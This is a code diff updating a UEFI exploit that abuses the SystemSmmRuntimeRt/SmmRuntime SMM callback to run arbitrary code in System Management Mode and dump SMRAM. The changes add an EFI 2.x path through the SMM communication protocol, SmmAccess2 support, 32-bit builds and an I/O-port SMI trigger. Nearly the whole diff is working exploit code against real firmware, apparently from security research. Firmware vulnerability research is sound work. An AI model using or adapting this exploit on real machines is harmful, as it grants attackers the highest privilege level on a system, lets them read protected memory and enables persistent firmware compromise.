@@ -17,12 +17,25 @@
 
 #include <Protocol/SmmBase.h>
 #include <Protocol/SmmAccess.h>
+#include <Protocol/SmmAccess2.h>
+#include <Protocol/SmmCommunication.h>
 #include <Protocol/LoadedImage.h>
 #include <Protocol/SimpleFileSystem.h>
 
 #include <Guid/SmmCommunicate.h>
 
 #include "hexdump.h"
+
+// determinate current architecture
+#if defined(_M_X64) || defined(__amd64__)
+
+#define IS64BIT
+
+#else
+
+#define IS32BIT
+
+#endif
 
 // SMM communication data size
 #define BUFF_SIZE 0x1000
@@ -35,12 +48,18 @@ EFI_GUID g_ImageNames[] = {
 
     // image name for SystemSmmRuntimeRt UEFI driver
     { 0x7C79AC8C, 0x5E6C, 0x4E3D, \
-      0xBA, 0x6F, 0xC2, 0x60, 0xEE, 0x7C, 0x17, 0x2E },
+      { 0xBA, 0x6F, 0xC2, 0x60, 0xEE, 0x7C, 0x17, 0x2E }},
 
     // image name for SmmRuntime UEFI driver from GIGABYTE firmware
-    { 0xA56897A1, 0xA77F, 0x4600,   \
-      0x84, 0xDB, 0x22, 0xB0, 0xA8, 0x01, 0xFA, 0x9A }
+    { 0xA56897A1, 0xA77F, 0x4600, \
+      { 0x84, 0xDB, 0x22, 0xB0, 0xA8, 0x01, 0xFA, 0x9A }}
 };
+
+// GUID for protocol/callback of SmmRuntime driver from EDK2
+#define SMM_RUNTIME_PROTOCOL_GUID \
+    { \
+        0xa56897a1, 0xa77f, 0x4600, { 0x84, 0xdb, 0x22, 0xb0, 0xa8, 0x1, 0xfa, 0x9a } \
+    }
 
 /*
     Callback function of SystemSmmRuntimeRt that runs in SMM, a2 argument has 
@@ -70,8 +89,19 @@ typedef struct
 
 } STRUCT_1;
 
+#if defined(IS64BIT)
+
+#define STRUCT_ADDR_OFFSET 0x20
+
+#elif defined(IS32BIT)
+
+#define STRUCT_ADDR_OFFSET 0x1C
+
+#endif
+
 UINTN g_SmmHandlerExecuted = 0;
-EFI_GUID g_SmmCommunicateHeaderGuid[] = SMM_COMMUNICATE_HEADER_GUID;
+EFI_GUID g_SmmCommunicateHeaderGuid = SMM_COMMUNICATE_HEADER_GUID;
+EFI_GUID g_SmmRuntimeProtocolGuid = SMM_RUNTIME_PROTOCOL_GUID;
 
 UINTN g_DumpSize = 0;
 VOID *g_DumpAddr = NULL;
@@ -212,6 +242,16 @@ _next_handle:
     return Status;
 }
 //--------------------------------------------------------------------------------------
+#if __GNUC__
+
+static __inline__ void __outbyte(unsigned short Port, unsigned char Data)
+{
+    // write byte to I/O port
+    __asm__ __volatile__("outb %b[Data], %w[Port]" : : [Port] "Nd" (Port), [Data] "a" (Data));
+}
+
+#endif
+
 VOID FireSynchronousSmi(UINT8 Handler, UINT8 Data)
 {
     // fire SMI using APMC I/O port
@@ -219,6 +259,8 @@ VOID FireSynchronousSmi(UINT8 Handler, UINT8 Data)
     __outbyte(0xb2, Handler);
 }
 //--------------------------------------------------------------------------------------
+#if defined(IS64BIT)
+
 /*    
     EFI_SMM_BASE_PROTOCOL->Communicate() saves SMM callback arguments at EFI_SMM_BASE_PROTOCOL + 0x40:
 
@@ -250,7 +292,7 @@ typedef struct
           return result;
         }
 */
-#define COMMUNICATE_GUID { 0x1279E288, 0x24CD, 0x47E9, 0x96, 0xBA, 0xD7, 0xA3, 0x8C, 0x17, 0xBD, 0x64 }
+#define COMMUNICATE_GUID { 0x1279E288, 0x24CD, 0x47E9, { 0x96, 0xBA, 0xD7, 0xA3, 0x8C, 0x17, 0xBD, 0x64 }}
 
 /* 
     This function is doing exact the same as EFI_SMM_BASE_PROTOCOL->Communicate(),
@@ -260,7 +302,7 @@ EFI_STATUS Communicate(EFI_SMM_BASE_PROTOCOL *SmmBase, EFI_HANDLE CallbackHandle
 {
     UINT8 SmiNum = 0;    
     VOID *Proto = NULL;
-    EFI_GUID Guid[] = COMMUNICATE_GUID;
+    EFI_GUID Guid[] = { COMMUNICATE_GUID };
 
     // locate OEM specific protocol
     EFI_STATUS Status = gBS->LocateProtocol(Guid, NULL, &Proto);
@@ -270,7 +312,7 @@ EFI_STATUS Communicate(EFI_SMM_BASE_PROTOCOL *SmmBase, EFI_HANDLE CallbackHandle
         COMMUNICATE_STRUCT *Comm = 
             (COMMUNICATE_STRUCT *)((UINT8 *)SmmBase + sizeof(EFI_SMM_BASE_PROTOCOL) + 0x18);        
 
-        printf("   SMM callback arguments are located at 0x%llx, SW SMI = %d\n", Comm, SmiNum);
+        printf("   SMM callback arguments are located at %p, SW SMI = %d\n", Comm, SmiNum);
 
         // save asynchronous SMM callback arguments
         Comm->CallbackHandle = CallbackHandle;
@@ -285,30 +327,20 @@ EFI_STATUS Communicate(EFI_SMM_BASE_PROTOCOL *SmmBase, EFI_HANDLE CallbackHandle
 
     return EFI_SUCCESS;
 }
+
+#endif
 //--------------------------------------------------------------------------------------
 EFI_STATUS SystemSmmRuntimeRt_Exploit(EXPLOIT_HANDLER Handler)
 {
     EFI_STATUS Status = EFI_SUCCESS;    
-    EFI_SMM_BASE_PROTOCOL *SmmBase = NULL;  
+    EFI_SMM_BASE_PROTOCOL *SmmBase = NULL;
+    EFI_SMM_COMMUNICATION_PROTOCOL *SmmComm = NULL;
 
-    STRUCT_1 Struct;   
-    UINTN DataSize = BUFF_SIZE, i = 0;
+    STRUCT_1 Struct;
+    UINTN DataSize = BUFF_SIZE;
     EFI_SMM_COMMUNICATE_HEADER *Data = NULL;
-
-    EFI_HANDLE HandlesList[MAX_HANDLES];
-    UINTN HandlesListLength = MAX_HANDLES;
-
-    memset(HandlesList, 0, sizeof(HandlesList));
+    
     g_SmmHandlerExecuted = 0;
-
-    // locate SMM base protocol
-    if ((Status = gBS->LocateProtocol(&gEfiSmmBaseProtocolGuid, NULL, &SmmBase)) != EFI_SUCCESS)
-    {
-        printf("ERROR: Unable to locate SMM base protocol: 0x%.8x\n", Status);
-        goto _end;
-    }
-
-    printf("SMM base protocol is at 0x%llx\n", SmmBase);    
 
     // allocate memory for SMM communication data
     if ((Status = gBS->AllocatePool(0, DataSize, (VOID **)&Data)) != EFI_SUCCESS)
@@ -317,38 +349,54 @@ EFI_STATUS SystemSmmRuntimeRt_Exploit(EXPLOIT_HANDLER Handler)
         goto _end;
     }
 
-    printf("Buffer for SMM communicate call is allocated at 0x%llx\n", Data);    
-    printf("Obtaining SystemSmmRuntimeRt image handles...\n");
+    printf("Buffer for SMM communicate call is allocated at %p\n", Data);    
 
-    /*
-        Obtain image handle, SystemSmmRuntimeRt UEFI driver registers sub_A54() as 
-        SMM callback using EFI_HANDLE of it's own image that was passed to driver entry.
-        We can determinate this handle value using LocateHandle() function of
-        EFI_BOOT_SERVICES.
+    /* 
+        EFI 1.x exploitation case: use SMM base protocol.
     */
-    if (GetImageHandle(g_ImageNames, sizeof(g_ImageNames) / sizeof(EFI_GUID), 
-                       HandlesList, &HandlesListLength) == EFI_SUCCESS)
+    if ((Status = gBS->LocateProtocol(&gEfiSmmBaseProtocolGuid, NULL, (VOID **)&SmmBase)) == EFI_SUCCESS)
     {
-        if (HandlesListLength > 0)
+        EFI_HANDLE HandlesList[MAX_HANDLES];
+        UINTN HandlesListLength = MAX_HANDLES, i = 0;
+
+        memset(HandlesList, 0, sizeof(HandlesList));
+
+        printf("SMM base protocol is at %p\n", SmmBase);
+        printf("Obtaining SystemSmmRuntimeRt image handles...\n");
+
+        /*
+            Obtain image handle, SystemSmmRuntimeRt UEFI driver registers sub_A54() as 
+            SMM callback using EFI_HANDLE of it's own image that was passed to driver entry.
+            We can determinate this handle value using LocateHandle() function of
+            EFI_BOOT_SERVICES.
+        */
+        if (GetImageHandle(g_ImageNames, sizeof(g_ImageNames) / sizeof(EFI_GUID), 
+                           HandlesList, &HandlesListLength) == EFI_SUCCESS)
         {
+            if (HandlesListLength == 0)
+            {
+                printf("ERROR: Image handles was not found\n");
+                goto _end;
+            }
+                
             // enumerate all image handles that was found
             for (i = 0; i < HandlesListLength; i += 1)
             {
                 EFI_HANDLE ImageHandle = HandlesList[i];
 
-                printf(" * Handle = 0x%llx\n", ImageHandle);  
+                printf(" * Handle = %p\n", ImageHandle);  
                 
                 DataSize = BUFF_SIZE;
                 
                 // set up data header
                 memset(Data, 0, DataSize);
-                memcpy(&Data->HeaderGuid, g_SmmCommunicateHeaderGuid, sizeof(EFI_GUID));                    
-                Data->MessageLength = DataSize - sizeof(EFI_SMM_COMMUNICATE_HEADER);                
+                memcpy(&Data->HeaderGuid, &g_SmmCommunicateHeaderGuid, sizeof(EFI_GUID));                    
+                Data->MessageLength = DataSize - sizeof(EFI_SMM_COMMUNICATE_HEADER);
 
                 // set up data body
                 Struct.Context = NULL;
                 Struct.Handler = Handler;
-                *(VOID **)((UINT8 *)Data + 0x20) = (VOID *)&Struct;  
+                *(VOID **)((UINT8 *)Data + STRUCT_ADDR_OFFSET) = (VOID *)&Struct;  
 
                 // queue SMM communication call                
                 Status = SmmBase->Communicate(SmmBase, ImageHandle, Data, &DataSize);
@@ -379,13 +427,66 @@ EFI_STATUS SystemSmmRuntimeRt_Exploit(EXPLOIT_HANDLER Handler)
             else
             {
                 printf("ERROR: Exploitation fails\n");
-            }                       
-        }       
+            }
+        }
+
+        goto _end;
+    }
+    else
+    {
+        printf("Unable to locate SMM base protocol: 0x%.8x\n", Status);
+    }
+
+    /* 
+        EFI 2.x exploitation case: use SMM communication protocol.
+    */
+    if ((Status = gBS->LocateProtocol(&gEfiSmmCommunicationProtocolGuid, NULL, (VOID **)&SmmComm)) == EFI_SUCCESS)
+    {
+        printf("SMM communication protocol is at %p\n", SmmComm);
+
+        DataSize = BUFF_SIZE;
+                
+        // set up data header
+        memset(Data, 0, DataSize);
+        memcpy(&Data->HeaderGuid, &g_SmmRuntimeProtocolGuid, sizeof(EFI_GUID));                    
+        Data->MessageLength = DataSize;                
+
+        // set up data body
+        Struct.Context = NULL;
+        Struct.Handler = Handler;
+        *(VOID **)(&Data->Data + STRUCT_ADDR_OFFSET) = (VOID *)&Struct; 
+
+        // communicate with SmmRuntime driver callback
+        Status = SmmComm->Communicate(SmmComm, Data, &DataSize);
+
+        printf(
+            "Communicate() returned status 0x%.8x, data size is 0x%x\n", 
+            Status, DataSize
+        );            
+
+        if (g_SmmHandlerExecuted == 0)
+        {
+            // fire any synchronous SMI to process pending SMM calls and execute arbitrary code
+            FireSynchronousSmi(0xFF, 0);
+        }
+
+        if (g_SmmHandlerExecuted > 0)
+        {
+            printf("SmmHandler() was executed, exploitation success!\n");            
+
+            Status = EFI_SUCCESS;
+        }
         else
         {
-            printf("ERROR: Image handles was not found\n");
-        } 
-    }  
+            printf("ERROR: Exploitation fails\n");
+        }   
+
+        goto _end; 
+    }
+    else
+    {
+        printf("Unable to locate SMM communication protocol: 0x%.8x\n", Status);
+    }
 
 _end:
 
@@ -435,10 +536,24 @@ int main(int Argc, char **Argv)
     char *lpszOutPath = NULL;
     EFI_STATUS Status = EFI_SUCCESS;    
     EFI_SMM_ACCESS_PROTOCOL *SmmAccess = NULL;      
+    EFI_SMM_ACCESS2_PROTOCOL *SmmAccess2 = NULL;
+
+    EFI_SMRAM_DESCRIPTOR SmramMap[MAX_SMRAM_REGIONS];
+    UINTN SmramMapSize = sizeof(SmramMap), i = 0;
 
     if (Argc >= 2)
     {
-        if ((g_DumpAddr = (VOID *)strtoull(Argv[1], NULL, 16)) == 0 && errno == EINVAL)
+
+#if defined(IS64BIT)
+
+        g_DumpAddr = (VOID *)strtoull(Argv[1], NULL, 16);
+
+#elif defined(IS32BIT)
+      
+        g_DumpAddr = (VOID *)strtoul(Argv[1], NULL, 16);
+
+#endif
+        if (g_DumpAddr == 0 && errno == EINVAL)
         {
             printf("strtoull() ERROR %d\n", errno);
             return errno;
@@ -463,7 +578,7 @@ int main(int Argc, char **Argv)
         }
 
         printf(
-            "Dumping 0x%llx bytes of memory from 0x%llx in SMM...\n", 
+            "Dumping %u bytes of memory from %p in SMM...\n", 
             g_DumpSize, g_DumpAddr
         );
 
@@ -478,20 +593,39 @@ int main(int Argc, char **Argv)
     }
 
     // locate SMM access protocol
-    if ((Status = gBS->LocateProtocol(&gEfiSmmAccessProtocolGuid, NULL, &SmmAccess)) == EFI_SUCCESS)
-    {
-        EFI_SMRAM_DESCRIPTOR SmramMap[MAX_SMRAM_REGIONS];
-        UINTN SmramMapSize = sizeof(SmramMap), i = 0;
+    if ((Status = gBS->LocateProtocol(&gEfiSmmAccessProtocolGuid, NULL, (VOID **)&SmmAccess)) != EFI_SUCCESS)
+    {        
+        printf("Unable to locate SMM access protocol: 0x%.8x\n", Status);
 
-        printf("SMM access protocol is at 0x%llx\n", SmmAccess);
+        // locate SMM access 2 protocol
+        if ((Status = gBS->LocateProtocol(&gEfiSmmAccess2ProtocolGuid, NULL, (VOID **)&SmmAccess2)) == EFI_SUCCESS)
+        {        
+            printf("SMM access 2 protocol is at %p\n", SmmAccess2);
+
+            // get SMRAM regions information
+            if ((Status = SmmAccess2->GetCapabilities(SmmAccess2, &SmramMapSize, SmramMap)) != EFI_SUCCESS)
+            {
+                printf("GetCapabilities() ERROR 0x%.8x\n", Status);
+            }
+        }
+        else
+        {
+            printf("Unable to locate SMM access 2 protocol: 0x%.8x\n", Status);
+        }
+    }
+    else
+    {
+        printf("SMM access protocol is at %p\n", SmmAccess);
 
         // get SMRAM regions information
         if ((Status = SmmAccess->GetCapabilities(SmmAccess, &SmramMapSize, SmramMap)) != EFI_SUCCESS)
         {
             printf("GetCapabilities() ERROR 0x%.8x\n", Status);
-            goto _end;
         }
+    }
 
+    if (Status == EFI_SUCCESS)
+    {        
         printf("Available SMRAM regions:\n");
 
         for (i = 0; i < SmramMapSize / sizeof(EFI_SMRAM_DESCRIPTOR); i += 1)
@@ -502,11 +636,7 @@ int main(int Argc, char **Argv)
                 SmramMap[i].PhysicalStart + SmramMap[i].PhysicalSize - 1
             );
         }
-    }
-    else
-    {
-        printf("WARNING: Unable to locate SMM access protocol: 0x%.8x\n", Status);
-    }    
+    } 
 
     // run exploit
     if (SystemSmmRuntimeRt_Exploit(SmmHandler) == EFI_SUCCESS)
@@ -526,12 +656,13 @@ int main(int Argc, char **Argv)
         }
     }
 
-_end:
-
     if (g_DumpBuff)
     {
         gBS->FreePool(g_DumpBuff);   
     }  
+
+    printf("Press any key to quit...\n");
+    getchar();
 
     return Ret;
 }
